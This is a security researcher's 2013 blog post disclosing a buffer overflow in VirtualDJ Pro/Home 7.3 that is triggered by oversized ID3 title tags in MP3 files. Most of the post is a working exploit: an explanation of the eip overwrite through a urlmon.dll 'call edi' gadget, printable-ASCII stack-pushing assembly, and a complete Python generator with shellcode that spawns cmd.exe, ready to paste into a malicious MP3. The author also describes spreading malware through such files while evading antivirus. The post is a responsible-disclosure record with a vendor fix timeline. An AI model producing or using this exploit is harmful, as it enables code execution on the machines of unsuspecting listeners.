---
layout: post
date: 2013-03-30 00:00:00 UTC
title: VirtualDJ Pro/Home 7.3: Buffer Overflow
---

I have found a buffer overflow vulnerability in [VirtualDJ Pro 7.3 and VirtualDJ Home 7.3](http://www.virtualdj.com/) and possibly previous versions of this software. When the user enters a folder, VirtualDJ tries to retrieve all information from the ID3 tags of MP3 files inside such as _Title_, _Album_, and _Artist_ and stores it in a buffer. After that, a second buffer of length 4096 is allocated in the stack and only the characters `[A-Z]` from the first buffer will be copied to it. According to the ID3 v2.x standard, these tags can have a length greater than 4096; therefore it is possible to produce a buffer overflow in this second buffer. At the time when the buffer overflow happens and the program reaches the `retn` instruction, the `edi` register points to the first buffer.

We cannot assign the `eip` the address of the first buffer directly since it contains characters which are not in range A-Z. However if we take into account the previous information, we can do this indirectly: We write in the bytes 4100:4104 of the title `"FSFD"`. After the buffer overflows occurs we get `eip == 0×44465346 == "FSFD"`. At this address (inside _urlmon.dll_) we find a `call edi` instruction and so the bytes in the first buffer will be executed. Now we face another problem. VirtualDJ has inserted a 0xC3 byte (`retn`) before each non-printable ASCII character in the first buffer and we cannot execute the shellcode directly. We can solve this by pushing into the stack the bytes of the shellcode using only printable ASCII characters. Let me explain:

Instead of pushing the bytes 0xB8, 0xFF, 0xEF, 0xFF (FFEFFFB8h) directly, we can do exactly the same using only printable ASCII characters by using the string `"%@@@@%????-R@D@-R@D@-R@D@-R?C?P"`:

```asm
and   eax, 40404040h   ; 25 40 40 40 40  == "%@@@@"
and   eax, 3F3F3F3Fh   ; 25 3F 3F 3F 3F  == "%????"  <– eax == 0
sub   eax, 40444052h   ; 2D 40 44 40 52  == "-R@D@"
sub   eax, 40444052h   ; 2D 40 44 40 52  == "-R@D@"
sub   eax, 40444052h   ; 2D 40 44 40 52  == "-R@D@"
sub   eax, 3F433F52h   ; 2D 3F 43 3F 52  == "-R?C?"  <– eax == 0xFFEFFFB8
push  eax              ; 50              == "P"
```

Once all the bytes of the shellcode are pushed into the stack (in inverse order) we use `push esp` (0×54) and `retn` (0xC3) to run the shellcode. Obviously, it does not matter if VirtualDJ pushes another 0xC3 byte before this one.

This is a pretty serious vulnerability since VirtualDJ is considered the #1 software for mixing music with millions of downloads around the world. By exploiting this vulnerability it would be possible to spread quickly a malware just by uploading a malicious MP3 file in a popular site. Even worse, this file might not be a suspicious file for antivirus software. Note how the 4096 padding bytes could be replaced by something apparently harmless such as the real title of the MP3 file followed by a lot of spaces.

```python
#Exploit: VirtualDJ Pro/Home <=7.3 Buffer Overflow Vulnerability 
#By: Alexandro Sanchez Bach | functionmixer.blogspot.com 
#More info: http://www.youtube.com/watch?v=PJeaWqMJRm0
 
import string
 
def unicodeHex(c):
    c = hex(ord(c))[2:].upper()
    if len(c)==1: c = "0"+c
    return c+"00"
 
def movEAX(s):
    #Arrays 
    s = map(ord, list(s))
    inst = []
    target = [512, 512, 512, 512]
    carry  = [0,-2,-2,-2]
    for i in range(4):
        if s[i] < 0x10:
            target[i] = 256
            if i < 3:
                carry[i+1] = -1
    diff = [target[b] - s[b] for b in range(4)]
 
    #Gen instructions 
    for i in range(3):
        target = [target[b] - diff[b]/4 for b in range(4)]
        inst += [[diff[b]/4 for b in range(4)]]
    target = [target[b] - s[b] + carry[b] for b in range(4)]
    inst += [target]
     
    #Remove characters '[','\',']' 
    for b in range(4):
        if ord("[")  in [inst[i][b] for i in range(4)] or \
           ord("\\") in [inst[i][b] for i in range(4)] or \
           ord("]")  in [inst[i][b] for i in range(4)]:
            for i in range(4):
                inst[i][b] = inst[i][b] + 5*((-1)**(i))
     
    inst  = ["\x2D" + "".join(map(chr, i)) for i in inst]
    return "".join(inst)

#Shellcode: Run cmd.exe 
shellcode  = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC"
shellcode += "\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45"
shellcode += "\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45"
shellcode += "\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45"
shellcode += "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3"
retAddress = "\xED\x1E\x94\x7C" # JMP ESP ntdll.dll WinXP SP2 
shellcode += retAddress
 
while len(shellcode) % 4 != 0:
    shellcode += '\x90'
exploit = ""
for i in range(0,len(shellcode),4)[::-1]:
    exploit += "\x25\x40\x40\x40\x40\x25\x3F\x3F\x3F\x3F"  #EAX = 0 
    exploit += movEAX(shellcode[i:i+4])  #EAX = shellcode[i:i+4] 
    exploit += "\x50"  #PUSH EAX 
exploit += '\x54\xC3' #PUSH ESP; RETN 
 
c = 0
for i in exploit:
    if i in string.ascii_letters:
        c += 1
exploit +=  "A" * (4100 - c)
exploit += "FSFD"
 
print exploit
#Paste the generated code in the tag 'Title' of the MP3 file.
```

You can see a demo of this proof of concept at: https://www.youtube.com/watch?v=PJeaWqMJRm0.

## Log

* __2012-11-29__: Bug discovered. VirtualDJ was emailed about this a few days later.
* __2013-03-20__: Bug fixed with the release of VirtualDJ Pro/Home 7.4.
* __2013-03-29__: Exploit published.
